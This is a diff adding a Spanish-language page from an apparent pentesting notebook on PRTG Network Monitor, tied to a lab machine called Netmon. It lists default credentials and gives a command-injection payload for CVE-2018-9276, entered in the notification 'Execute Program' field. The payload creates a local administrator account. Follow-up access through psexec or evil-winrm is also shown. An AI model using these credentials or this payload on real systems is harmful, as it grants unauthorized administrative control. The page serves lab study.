@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>PRTG Network Monitor | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="prtg-network-monitor">
+          <div class="note-tabbar">
+            <span>PRTG Network Monitor</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Aplicaciones Web/Administración y monitorización</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">aplicaciones web / administración y monitorización / prtg network monitor</p>
+            <h2>PRTG Network Monitor</h2>
+
+            <section class="code-card">
+              <h3>Credenciales por defecto</h3>
+              <pre><code>prtgadmin:prtgadmin
+prtgadmin:Password123</code></pre>
+            </section>
+
+            <h2>PRTG Network Monitor < 18.2 (CVE-2018-9276)</h2>
+
+            <aside class="callout warning">
+              <p>Para explotar esta vulnerabilidad hacen falta credenciales válidas y acceso al panel web.</p>
+            </aside>
+
+            <p><em>Crear una nueva notificación.</em></p>
+
+            <div class="note-figure-grid">
+              <figure class="note-figure"><img src="/notebook/assets/obsidian/prtg-notification-settings.png" alt="Pantalla de configuración de notificaciones en PRTG" /></figure>
+              <figure class="note-figure"><img src="/notebook/assets/obsidian/prtg-notification-add.png" alt="Botón para crear una notificación en PRTG" /></figure>
+            </div>
+
+            <p><em>Basic Notification Setting: Powned</em></p>
+
+            <figure class="note-figure">
+              <img src="/notebook/assets/obsidian/prtg-basic-notification.png" alt="Configuración básica de una notificación en PRTG" />
+            </figure>
+
+            <p><em>Payload en Execute Program: el usuario que ejecuta PRTG suele tener privilegios altos en el sistema.</em></p>
+
+            <section class="code-card">
+              <h3>Payload: crear usuario y añadirlo a administradores</h3>
+              <pre><code>test.txt;net user &lt;user&gt; &lt;password&gt; /add; net localgroup Administrators &lt;user&gt; /add</code></pre>
+            </section>
+
+            <figure class="note-figure">
+              <img src="/notebook/assets/obsidian/prtg-execute-program.png" alt="Campo Execute Program con payload en PRTG" />
+            </figure>
+
+            <p><em>Ejecutar la notificación.</em></p>
+
+            <div class="note-figure-grid">
+              <figure class="note-figure"><img src="/notebook/assets/obsidian/prtg-run-notification.png" alt="Ejecución manual de una notificación en PRTG" /></figure>
+              <figure class="note-figure"><img src="/notebook/assets/obsidian/prtg-run-notification-button.png" alt="Botón de ejecución de notificación en PRTG" /></figure>
+            </div>
+
+            <p>Después se puede probar conexión con <code>psexec</code> por SMB o con <code>evil-winrm</code> si WinRM está expuesto en el puerto 5985.</p>
+
+            <figure class="note-figure">
+              <img src="/notebook/assets/obsidian/prtg-winrm-psexec-access.png" alt="Acceso posterior con psexec o evil-winrm" />
+            </figure>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=netmon">Netmon</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>aplicaciones_web</span>
+              <span>prtg</span>
+              <span>paessler</span>
+              <span>cve_2018_9276</span>
+              <span>rce</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
